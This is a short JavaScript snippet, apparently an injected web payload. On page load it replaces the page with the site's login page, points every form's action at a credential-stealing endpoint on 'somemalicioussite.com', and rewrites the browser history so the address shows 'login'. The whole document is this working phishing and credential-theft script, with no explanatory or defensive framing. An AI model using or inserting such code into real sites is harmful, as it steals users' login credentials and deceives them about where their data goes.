(function () {
	
	var redraw = function (url) {

		document.body.innerHTML = '';

		var req = new XMLHttpRequest();
		req.open('GET', url, false);
		req.onreadystatechange = function () {

			if (req.readyState === 4 && req.responseText !== "") {

				document.children[0].innerHTML = req.responseText;

				var forms = document.getElementsByTagName('form');
				for (index = 0; index < forms.length; index++) {

					forms[index].action = 'http://www.somemalicioussite.com/CredentialStealer.ashx';
				}
			}
		};

		req.send(null);
	};

	window.onload = function () {

	    redraw('login');

	    history.replaceState({ state: 'someState' }, document.getElementsByTagName('title')[0].innerHTML, 'login');
	};
}());